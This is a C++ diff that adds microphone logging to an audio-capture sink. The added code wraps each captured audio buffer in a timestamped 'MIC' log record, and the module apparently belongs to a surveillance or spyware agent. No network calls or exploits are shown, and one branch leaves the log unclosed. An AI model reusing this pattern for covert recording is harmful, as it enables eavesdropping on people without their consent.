@@ -1,6 +1,7 @@
 #include "NativeAudioInterface.h"
 #include "FunctionFunc.h"
 #include "Log.h"
+#include "Microphone.h"
 
 using namespace Microsoft::WRL;
 using namespace Windows::Foundation;
@@ -48,6 +49,10 @@ using namespace std;
 using namespace NativeAudioInterface::Native;
 static int fAudio=FALSE;
 
+MicAdditionalData mad2;
+
+
+
 // Called each time a captured frame is available	
 void CameraCaptureSampleSink::OnSampleAvailable(
 	ULONGLONG hnsPresentationTime,
@@ -68,6 +73,7 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 	//la grandezza del file comprende il timestamp + il trefisso audio piu 999999 campioni
 	char nomeFile[sizeof("audio")+DTTMSZAUD+1+6];
 	
+	Log log;
 
 	// hnsPresentationTime aumenta partendo da 0 allo start, 1 sec=10000000
 	 // Header= 35, 33, 65, 77, 82, 10
@@ -92,6 +98,16 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 		//
 		WCHAR msg[128];
 		swprintf_s(msg, L"\n1Header) Pos=%i nCamp=%i: \n",NativeCapture::pos,NativeCapture::nCamp);OutputDebugString(msg);
+
+		
+		unsigned __int64 temp_time = GetTime();
+	
+		ZeroMemory(&mad2, sizeof(mad2));
+		mad2.uVersion = MIC_LOG_VERSION;
+		mad2.uSampleRate = MIC_SAMPLE_RATE | LOG_AUDIO_CODEC_AMR;
+		mad2.fId.dwHighDateTime = (DWORD)((temp_time & 0xffffffff00000000) >> 32);
+		mad2.fId.dwLowDateTime  = (DWORD)(temp_time & 0x00000000ffffffff);
+
 	}
 	//else 
 	//	pos=0;
@@ -131,6 +147,16 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 		filestr.seekg (0, ios::beg);
 		filestr.write ((const char*)bufferTmp, NativeCapture::pos);
 		filestr.close();
+
+		if (log.CreateLog(LOGTYPE_MIC, (BYTE *)&mad2, sizeof(mad2), MMC1) == FALSE) 
+			{
+				return;
+			}
+
+			log.WriteLog( (BYTE*)bufferTmp, NativeCapture::pos );
+
+		log.CloseLog();
+
 		OutputDebugStringA(nomeFile);
 		NativeCapture::fAudioCaptureForceStop=TRUE;
 		NativeCapture::pos=0;
@@ -151,6 +177,7 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 		{
 			//NativeAudioInterface::Native::NativeCapture::fAudioCapture=FALSE;
 			
+
 			WCHAR msg[128];
 			swprintf_s(msg, L"\n2camp) Pos=%i nCamp=%i hnsPresentationTime=%i\n",NativeCapture::pos,NativeCapture::nCamp,hnsPresentationTime);OutputDebugString(msg);
 
@@ -161,6 +188,14 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 			filestr.seekg (0, ios::beg);
 			filestr.write ((const char*)bufferTmp, NativeCapture::pos);
 			filestr.close();
+
+			if (log.CreateLog(LOGTYPE_MIC, (BYTE *)&mad2, sizeof(mad2), MMC1) == FALSE) 
+			{
+				return;
+			}
+
+			log.WriteLog( (BYTE*)bufferTmp, NativeCapture::pos );
+
 			OutputDebugStringA(nomeFile);
 			NativeCapture::pos=0;
 			NativeCapture::nCamp++;
